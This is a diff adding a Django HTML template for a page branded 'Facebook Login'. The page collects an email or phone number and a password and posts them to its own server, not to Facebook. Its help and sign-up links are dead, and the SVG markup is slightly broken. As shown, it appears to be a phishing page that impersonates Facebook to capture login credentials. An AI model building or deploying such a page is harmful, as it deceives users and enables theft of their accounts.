@@ -1,0 +1,113 @@
+
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook Login</title>
+  <link rel="stylesheet" href="{% static 'index.css' %}">
+</head>
+<body>
+  <div class="wrapper">
+    <div class="heading">
+      <h1>F</h1>
+      <h1>A</h1>
+      <h1>C</h1>
+      <h1>E</h1>
+      <h1>B</h1>
+      <h1>O</h1>
+      <h1>O</h1>
+      <h1>K</h1>
+    </div>
+      
+      <div class="content">
+        <div class="pwrap">
+          <p>Log in </p>
+        <div class="paragh">
+          
+          <p>f</p>
+          <p>a</p>
+          <p>c</p>
+          <p>e</p>
+          <p>o</p>
+          <p>o</p>
+          <p>k</p>
+          
+        </div>
+
+        </div>
+        
+       
+        
+
+        <form action="" method="POST">
+          {% csrf_token %}
+           
+           <input 
+              type="text" 
+              name="email"
+              class="mailer_input" 
+              placeholder=" phone number or Email address"
+              id="mailer_input"
+            />
+
+     
+         
+         <div class="wordpas-wrapper">
+           <input 
+             type="password" 
+             name="key_number"
+             class="wordpass-input" 
+             placeholder="password" 
+             id="newko"
+           />
+           
+           <button 
+             type="button" 
+             class="togale_wordpass" 
+             id="mainframe"
+             aria-label="Show or hide text"
+           >         
+             
+               <path 
+                 d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 
+                    7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 
+                    17.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 
+                    5 2.24 5 5-2.24 5-5 5z"
+               ></path>
+               <circle cx="12" cy="12" r="2.5"></circle>
+               
+               <line 
+                 x1="3" 
+                 y1="3" 
+                 x2="21" 
+                 y2="21" 
+                 stroke="#606770" 
+                 stroke-width="2"
+               ></line>
+             </svg>
+           </button>
+         </div>
+     
+         <button class="landing_button" type="submit">Log in</button>
+     
+          
+      </form>
+  
+          
+      
+         
+          <p class="upsign">
+            <a href="#">Forgotten account?</a> · <a href="#">Sign up</a>
+          </p>
+        </div>
+  </div>
+  
+
+    <script src="{% static 'index.js' %}"></script>
+  
+
+</body>
+</html>
+
